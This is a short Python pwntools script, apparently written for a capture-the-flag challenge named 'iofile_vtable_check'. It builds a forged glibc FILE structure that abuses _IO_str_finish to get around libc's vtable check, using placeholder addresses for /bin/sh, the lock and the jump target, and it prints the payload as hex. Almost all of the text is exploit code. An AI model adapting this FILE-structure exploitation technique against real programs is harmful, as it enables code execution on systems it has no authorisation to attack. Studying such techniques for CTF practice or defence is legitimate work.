from pwn import *
import _IO_FILE
 
 
e = ELF("./iofile_vtable_check")
#l = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")
 
 
 
binsh = 0x6666666666666666
io_file = _IO_FILE._IO_file_plus()
payload = io_file.set_IO_str_finish({"_lock" : p64(0x1111111111111111),
                                        "_IO_write_end" : p64(binsh),
                                        "_IO_buf_base" : p64(binsh),
                                        "vtable" : p64(0x3333333333333333),
                                        "jump" : p64(0x4141414141414141)
                                    })
print payload.encode('hex')
